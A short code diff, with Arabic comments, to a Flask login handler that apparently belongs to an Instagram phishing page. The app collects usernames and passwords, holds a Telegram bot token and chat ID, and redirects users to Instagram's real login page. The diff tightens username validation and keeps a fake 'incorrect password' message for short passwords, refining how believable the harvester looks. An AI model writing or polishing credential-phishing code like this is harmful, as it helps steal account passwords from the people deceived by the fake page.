@@ -9,7 +9,6 @@ app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# تم التعديل لتوجيه المستخدم إلى صفحة تسجيل الدخول الرسمية لإنستغرام
 INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"
 
 
@@ -21,15 +20,13 @@ def login():
     username_val = request.form.get("username", "").strip()
     password = request.form.get("password", "")
 
-    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
-    username_pattern = r"^[a-zA-Z0-9_\.]{3,30}$"
+    # شرط اليوزر: حروف إنجليزية (صغيرة أو كبيرة)، أرقام، نقاط، أو شرطة سفلى، وبطول 4 أحرف على الأقل
+    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
-    if not (
-        re.match(email_pattern, username_val)
-        or re.match(username_pattern, username_val)
-    ):
+    if not re.match(username_pattern, username_val):
       error = (
-          "عذراً، يرجى إدخال اسم مستخدم أو بريد إلكتروني صحيح مرتبط بحسابك."
+          "عذراً، يجب أن يتكون اسم المستخدم من 4 أحرف أو أرقام إنجليزية على الأقل"
+          " (بدون مسافات أو رموز عربية)."
       )
     elif len(password) <= 5:
       error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
